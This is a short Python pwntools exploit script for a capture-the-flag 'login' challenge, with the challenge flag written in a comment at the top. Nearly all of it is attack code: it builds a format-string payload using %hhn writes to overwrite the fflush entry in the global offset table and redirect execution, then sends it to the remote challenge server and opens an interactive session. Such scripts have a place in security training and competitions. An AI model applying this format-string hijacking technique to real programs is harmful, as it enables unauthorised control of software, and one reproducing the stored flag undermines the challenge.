#flag = p_ctf{0nly_h4ck3r5_c4n_l061n}
from pwn import *

elf = ELF("./login")

target = process([elf.path])
target = remote("chall.ctf.pragyan.org", 30105)

goto = 0x8049427

n = 16

payload  = "%" + str(0x27) + "c" + "%" + str(n) + "$hhn" + "%" + str(0x94 - 0x27) + "c" + "%" + str(n+1) + "$hhn"
payload += "%" + str(0x104 - 0x94) + "c" + "%" + str(n+2) + "$hhn" + "%" + str(0x108 - 0x104) + "c" + "%" + str(n+3) + "$hhn"
payload += " "*3
payload += p32(elf.got['fflush']) + p32(elf.got['fflush'] + 1) + p32(elf.got['fflush'] + 2) + p32(elf.got['fflush'] + 3)
print str(len(payload))

target.sendline(payload)

target.interactive()